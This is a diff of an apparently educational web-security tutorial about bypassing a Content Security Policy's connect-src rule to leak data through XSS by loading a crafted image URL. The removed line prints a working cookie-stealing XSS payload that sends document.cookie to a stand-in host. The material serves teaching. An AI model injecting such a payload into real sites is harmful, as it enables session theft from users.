@@ -155,8 +155,11 @@ When the script is triggered on the victim's machine, you'll see their cookies s
 <img width="1005" height="166" alt="image" src="https://github.com/user-attachments/assets/6c965f4b-559e-450b-828c-1e4baac99569" /><br><br>
 
 If you found an XSS vulnerability and bypassed CSP, but can't leak any information with it via XHR requests or fetch, the <code>connect-src</code> policy may be blocking your requests. This can be bypassed if the website you're exploiting doesn't have strict settings for directives such as image-src and media-src, which can be abused to leak information.<br><br>
+<br>
+<br>
 
-For example, if a website is blocking all of your XHR requests but allows images to be loaded from any location, you can abuse this with JavaScript to load a specially crafted URL that masquerades as an image, like so: <code><script>(new Image()).src = `https://example.com/${encodeURIComponent(document.cookie)}`</script></code>.
+<img width="1012" height="47" alt="image" src="https://github.com/user-attachments/assets/0c03034b-feb6-4cd4-b27a-0e79fb3b043a" />
+
 
 <p><em>Answer the question below</em></p>
 
